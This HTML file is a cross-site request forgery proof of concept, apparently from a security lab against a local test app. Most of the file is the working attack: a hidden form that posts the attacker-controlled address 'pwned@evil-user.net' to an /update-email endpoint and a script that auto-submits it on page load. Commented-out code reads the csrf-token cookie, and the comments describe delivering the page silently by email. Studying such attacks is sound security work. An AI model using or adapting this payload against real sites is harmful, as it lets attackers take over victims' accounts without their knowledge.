<!--
    Malicious webpage. In production, could be sent in an email (link to it
    embedded in another website, or as the HTML email body itself) to 
    automate the attack, silently. This was based from code generated by 
    the BurpSuite Professionral CSRF-builder;
-->
<html>
    <!--
    <head>
    <script>
        function getCookie(cname) {
            
            let name = cname + "=";
            let decodedCookie = decodeURIComponent(document.cookie);
            let ca = decodedCookie.split(';');

            for(let i = 0; i <ca.length; i++) {
                let c = ca[i];

                while (c.charAt(0) == ' ') {
                    c = c.substring(1);
                }
                
                if (c.indexOf(name) == 0) {
                    return c.substring(name.length, c.length);
                }
            }
            
            return "";
        }
    </script>
    </head>
    -->
    <body>
        
        <!-- 
            Malicious payload: Set the attacker's email to the current user's
            email.
        -->
        <form action="http://127.0.0.1:5000/update-email" method="POST">
            <input type="hidden" name="new_email" value="pwned@evil-user.net" />
        </form>

        <script>
            // NOTE: This will cause the target URL to load IMMEDIATELY.
            // This is not necessary for a CSRF, but it does show how
            // subversive this attack can be.
            //document.getElementById("csrf-token").value = getCookie("csrf-token");
            //console.log(getCookie("Cookie"));
            //console.log(getCookie("csrf-token"));
            document.forms[0].submit(); 
        </script>

    </body>
</html>